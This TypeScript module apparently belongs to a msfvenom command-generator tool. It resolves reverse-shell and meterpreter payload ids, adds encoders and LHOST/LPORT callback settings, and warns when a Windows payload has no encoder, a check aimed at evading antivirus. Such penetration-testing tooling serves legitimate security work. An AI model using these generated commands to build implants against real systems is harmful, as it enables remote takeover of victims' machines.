import type { ArchId } from "./archs";
import type { MsfvenomEncoder } from "./encoders";
import type { MsfvenomFormat } from "./formats";
import type { ExitfuncId } from "./params";
import type { MsfvenomPayload } from "./payloads";

export interface MsfvenomSelection {
  payload: MsfvenomPayload;
  arch: ArchId | null;
  format: MsfvenomFormat;
  encoder: MsfvenomEncoder;
  iterations: number;
  lhost: string;
  lport: number;
  exitfunc: ExitfuncId | null;
  filename: string;
  extraOptions: string;
}

/** Substitutes the "{arch}" path-segment token for Linux/macOS payloads (e.g.
 *  linux/{arch}/shell_reverse_tcp -> linux/x64/shell_reverse_tcp) for every arch, including x86.
 *  For Windows, x86 is msfvenom's flat/implicit module (no segment) and only x64 needs an
 *  explicit "x64/" segment inserted right after "windows/" (e.g.
 *  windows/meterpreter/reverse_tcp -> windows/x64/meterpreter/reverse_tcp). Flag-only payload ids
 *  (Android/Python) pass through unchanged regardless of arch — they have no per-arch module. */
export function resolvePayloadId(payload: MsfvenomPayload, arch: ArchId | null): string {
  if (payload.archPlacement === "path-segment" && arch) {
    return payload.id.replace("{arch}", arch);
  }
  if (payload.archPlacement === "windows-arch-segment" && arch && arch !== "x86") {
    return payload.id.replace(/^windows\//, `windows/${arch}/`);
  }
  return payload.id;
}

export function suggestFilename(payload: MsfvenomPayload, format: MsfvenomFormat, arch: ArchId | null): string {
  const withArch = arch && format.category === "executable" ? `${payload.filenameSlug}_${arch}` : payload.filenameSlug;
  const extension = payload.filenameExtension ?? format.extension;
  return extension ? `${withArch}.${extension}` : withArch;
}

/** True when the command needs -o <filename> — either the format conventionally produces a file,
 *  or the payload forces one regardless of format (e.g. Android's -f raw -o file.apk). */
export function requiresOutputFilename(payload: MsfvenomPayload, format: MsfvenomFormat): boolean {
  return format.producesFile || Boolean(payload.forceOutputFilename);
}

/** Pure, deterministic command builder — flag order:
 *  msfvenom -p <resolved> -f <format> [-e <encoder> -i <n>] [-a <arch>] LHOST= LPORT=
 *  [EXITFUNC=] [<extra options>] [-o <filename>]
 *  -a only applies to "flag-only" payloads (Android/Python) — in practice those are archless
 *  (archs: []), so -a never actually appears in a generated command today. Path-segment and
 *  windows-arch-segment payloads (Linux/macOS/Windows) always bake arch into -p instead, since
 *  msfvenom's own module resolution doesn't retarget a module's arch via -a (see params.ts). */
export function buildCommand(sel: MsfvenomSelection): string {
  const parts: string[] = ["msfvenom", "-p", resolvePayloadId(sel.payload, sel.arch), "-f", sel.format.id];

  if (sel.encoder.id !== "none") {
    parts.push("-e", sel.encoder.id, "-i", String(sel.iterations));
  }

  if (sel.arch && sel.payload.archPlacement === "flag-only") {
    parts.push("-a", sel.arch);
  }

  parts.push(`LHOST=${sel.lhost}`, `LPORT=${String(sel.lport)}`);

  if (sel.exitfunc) {
    parts.push(`EXITFUNC=${sel.exitfunc}`);
  }

  const extra = sel.extraOptions.trim();
  if (extra.length > 0) {
    parts.push(extra);
  }

  if (requiresOutputFilename(sel.payload, sel.format)) {
    parts.push("-o", sel.filename);
  }

  return parts.join(" ");
}

export function buildBashVariable(command: string): string {
  return `CMD="${command}"\n$CMD`;
}

export function buildListenerParamsOnly(sel: MsfvenomSelection): string {
  return `LHOST=${sel.lhost} LPORT=${String(sel.lport)}`;
}

/** Live/pre-generate risk check (spec's "no encoder on Windows" warning) — pure so it's usable
 *  both for the inline picker-state warning and a post-generate summary. */
export function hasNoEncoderRisk(payload: MsfvenomPayload, encoder: MsfvenomEncoder): boolean {
  return payload.platform === "windows" && encoder.id === "none";
}
